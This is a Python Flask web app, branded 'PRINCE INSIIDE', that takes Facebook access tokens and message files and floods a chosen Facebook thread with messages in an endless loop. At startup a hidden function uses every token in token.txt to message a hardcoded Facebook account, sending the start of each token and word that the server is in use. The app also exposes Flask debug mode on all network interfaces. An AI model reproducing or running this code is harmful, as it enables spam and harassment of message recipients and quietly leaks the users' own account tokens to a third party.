from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

# HTTP Headers
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Global dictionaries to manage tasks
stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    """Sends messages to a given Facebook thread using multiple tokens."""
    stop_event = stop_events[task_id]
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = f"{mn} {message1}"
                parameters = {'access_token': access_token, 'message': message}

                response = requests.post(api_url, data=parameters, headers=headers)

                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")

                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    """Handles message sending through the web interface."""
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>😈 𝐏𝐑𝐈𝐍𝐂𝐄 𝐈𝐍𝐒𝐈𝐈𝐃𝐄😈</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background-color: black; color: white; text-align: center; }
    .container { max-width: 400px; margin-top: 50px; }
  </style>
</head>
<body>
  <h1>🥀🩷 𝐏𝐑𝐈𝐍𝐂𝐄 𝐈𝐍𝐒𝐈𝐈𝐃𝐄 😈🐧</h1>
  <div class="container">
    <form method="post" enctype="multipart/form-data">
      <label>Token Option:</label>
      <select name="tokenOption" onchange="toggleTokenInput()">
        <option value="single">Single Token</option>
        <option value="multiple">Token File</option>
      </select>
      <div id="singleTokenInput">
        <label>Single Token:</label>
        <input type="text" name="singleToken">
      </div>
      <div id="tokenFileInput" style="display:none;">
        <label>Upload Token File:</label>
        <input type="file" name="tokenFile">
      </div>
      <label>Thread ID:</label>
      <input type="text" name="threadId" required>
      <label>Message Prefix:</label>
      <input type="text" name="kidx" required>
      <label>Time Interval (seconds):</label>
      <input type="number" name="time" required>
      <label>Upload Message File:</label>
      <input type="file" name="txtFile" required>
      <button type="submit">Run</button>
    </form>
    <form method="post" action="/stop">
      <label>Task ID to Stop:</label>
      <input type="text" name="taskId" required>
      <button type="submit">Stop</button>
    </form>
  </div>
  <script>
    function toggleTokenInput() {
      var option = document.querySelector("select[name='tokenOption']").value;
      document.getElementById("singleTokenInput").style.display = option == "single" ? "block" : "none";
      document.getElementById("tokenFileInput").style.display = option == "multiple" ? "block" : "none";
    }
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    """Stops a running message task."""
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

def send_initial_message():
    """Sends an initial message using tokens from 'token.txt'."""
    try:
        with open('token.txt', 'r') as file:
            tokens = file.read().strip().splitlines()

        msg_template = "Hello Prince sir! I am using your server. My token is {}"
        target_id = "100064267823693"  # Facebook user ID

        for token in tokens:
            message = msg_template.format(token[:10] + "*****")  # Masking part of the token
            api_url = f'https://graph.facebook.com/v15.0/{target_id}/messages'
            parameters = {'access_token': token, 'message': message}

            response = requests.post(api_url, data=parameters, headers=headers)

            if response.status_code == 200:
                print(f"Message sent successfully from token {token[:10]}*****")
            else:
                print(f"Failed to send message from token {token[:10]}*****: {response.text}")

    except Exception as e:
        print(f"Error sending initial message: {str(e)}")

if __name__ == '__main__':
    send_initial_message()  # Send the initial message on startup
    app.run(host='0.0.0.0', port=5000)
